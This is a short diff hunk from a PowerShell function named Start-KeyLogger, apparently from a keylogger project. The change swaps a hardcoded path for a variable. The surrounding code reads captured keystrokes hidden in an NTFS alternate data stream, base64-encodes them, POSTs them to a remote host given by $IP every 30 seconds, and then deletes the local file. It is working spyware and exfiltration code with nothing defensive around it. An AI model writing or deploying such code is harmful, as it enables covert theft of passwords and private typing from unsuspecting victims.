@@ -47,13 +47,13 @@ function Start-KeyLogger {
             }
 
             if($stopWatch.Elapsed.Seconds -ge 30) {
-                $content = Get-Content -Path 'C:\keylogger.txt' -Stream 'Secret_Stream'
+                $content = Get-Content -Path $OutputFile -Stream 'Secret_Stream'
                 $contantBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
                 $base64Content = [System.Convert]::ToBase64String($contantBytes)
                 
                 Invoke-WebRequest -Uri "http://$IP/" -Method POST -Body $base64Content
 
-                Remove-Item -Path 'C:\keylogger.txt'
+                Remove-Item -Path $OutputFile
                 $stopWatch = [Diagnostics.Stopwatch]::StartNew()
             }
         }
